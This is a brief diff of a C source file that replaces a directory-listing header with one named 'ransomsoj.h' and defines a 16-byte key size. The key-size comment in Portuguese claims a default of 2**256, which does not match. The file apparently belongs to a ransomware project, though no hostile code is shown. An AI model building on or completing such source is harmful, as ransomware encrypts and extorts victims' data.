@@ -7,11 +7,12 @@
 #include <stdlib.h>
 #include <math.h>
 #include <string.h>
-#include "listdir.h"
 #include <sys/types.h>
 #include <errno.h>
 #include <dirent.h>
 #include <limits.h>
+
+#include "ransomsoj.h"
 
 
 #define TAMANHO_CHAVE   16      /*tamanho da chave em bytes ,padrao 2**256 para quando ela for gerada automaticamente*/
